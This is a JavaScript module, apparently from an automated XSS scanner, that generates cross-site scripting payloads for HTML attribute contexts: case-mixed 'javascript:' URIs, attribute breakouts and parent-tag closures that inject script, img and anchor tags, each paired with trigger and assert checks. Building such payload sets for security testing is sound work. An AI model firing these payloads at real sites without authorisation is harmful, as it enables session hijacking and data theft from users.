const {getTriggerCodeForCode} = require('./generators');

function htmlExecuteAttributePayloads({reflection, jsCode, scriptTag, imgTag, aTag, pTag, tagTrigger, assert}) {
    return[{
        payload: jsCode,
        trigger: getTriggerCodeForCode(jsCode),
        assert,
    }, {
        payload: `JAvaSCriPt:${jsCode}`,
        trigger: getTriggerCodeForCode(`JAvaSCriPt:${jsCode}`),
        assert,
    }, {
        payload: `">${scriptTag}`,
        assert,
    }, {
        payload: `">${imgTag}`,
        assert,
    }, {
        payload: `">${aTag}`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `">${pTag}`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `"></${reflection.parentName}>${scriptTag}<${reflection.parentName} ${reflection.nodeName}="`,
        assert,
    }, {
        payload: `"></${reflection.parentName}>${imgTag}<${reflection.parentName} ${reflection.nodeName}="`,
        assert,
    }, {
        payload: `"></${reflection.parentName}>${aTag}<${reflection.parentName} ${reflection.nodeName}="`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `"></${reflection.parentName}>${pTag}<${reflection.parentName} ${reflection.nodeName}="`,
        trigger: tagTrigger,
        assert,
    }];
}

module.exports = htmlExecuteAttributePayloads;
